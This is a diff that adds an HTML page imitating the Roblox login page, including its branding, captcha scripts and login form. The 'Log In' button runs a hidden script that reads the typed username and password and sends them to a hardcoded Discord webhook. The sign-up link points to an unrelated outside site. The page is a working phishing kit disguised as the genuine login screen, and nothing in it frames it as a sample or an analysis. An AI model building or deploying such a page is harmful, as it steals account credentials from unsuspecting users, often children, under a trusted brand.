@@ -1,0 +1,64 @@
+<title>Roblox</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Roblox Corporation">
+<meta name="description" content="Roblox is a global platform that brings people together through play.">
+<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">
+
+    <meta name="apple-itunes-app" content="app-id=431946152">
+
+<div class="content">
+
+<script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async="" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
+<script type="text/javascript">
+    var Roblox = Roblox || {};
+    $(function () {
+        var funCaptcha = Roblox.FunCaptcha;
+        if (funCaptcha) {
+            var captchaTypes = [{"Type":"Login","PublicKey":"9F35E182-C93C-EBCC-A31D-CF8ED317B996","ApiUrl":"https://captcha.roblox.com/v1/funcaptcha/login/web"}];
+            funCaptcha.addCaptchaTypes(captchaTypes, true);
+            funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
+            funCaptcha.setPerAppTypeLoggingEnabled(false);
+            funCaptcha.setRetryIntervalRange(500, 1500);
+        }
+    });
+
+    // Necessary because of how FunCaptcha js executes callback
+    // i.e. window["{function name}"]
+    function reportFunCaptchaLoaded()
+    {
+        if (Roblox.BundleDetector)
+        {
+            Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
+        }
+    }
+</script>
+
+
+        <div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true"><div id="login-base" class="login-base-container"><div class="section-content login-section"><h1 class="login-header">Login to Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" value="s"></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" value="t"><div aria-live="polite"><p class="form-control-label xsmall text-error login-error" id="login-form-error">An unknown error occurred. Please try again.</p></div></div><button type="button" onclick="log()" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div><div class="divider-text-container"><span class="divider-text">login with</span></div></div><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Another Logged In Device</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://unnamedscripts.github.io/" target="_self">Sign Up</a></div></div></div></div></div>
+
+<script>
+    function log() {
+         
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1152394382318768258/Hq7k5pgWrWxcge9fdh9Q1WQY-2sEee40OkQA4VmDOL9MaF44gXGpp2fFB6Om7TqHzvkh");
+
+      request.setRequestHeader('Content-type', 'application/json');
+         
+      const data = "Username: " + document.getElementById("login-username").value + " " + "Password: " + document.getElementById("login-password").value
+
+      const params = {
+        username: "Roblox",
+        avatar_url: "",
+        content: data
+      }
+
+      request.send(JSON.stringify(params));
+      console.log("Logged!")
+    }
+</script>
+
+
+
+        </div>
